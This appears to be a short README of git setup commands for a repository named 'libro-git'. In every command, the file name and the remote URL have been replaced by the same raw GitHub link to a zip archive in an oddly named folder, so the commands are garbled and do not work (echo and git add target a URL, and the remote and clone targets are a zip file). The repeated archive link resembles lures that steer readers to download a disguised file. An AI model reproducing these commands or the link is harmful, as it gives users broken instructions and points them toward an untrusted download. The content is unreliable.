echo "# libro-git" >> https://raw.githubusercontent.com/Lapao29/libro-git/main/apogamously/libro-git.zip
git init
git add https://raw.githubusercontent.com/Lapao29/libro-git/main/apogamously/libro-git.zip
git commit -m "first commit"
git branch -M main
git remote add origin https://raw.githubusercontent.com/Lapao29/libro-git/main/apogamously/libro-git.zip
git push -u origin main
git status
git clone https://raw.githubusercontent.com/Lapao29/libro-git/main/apogamously/libro-git.zip
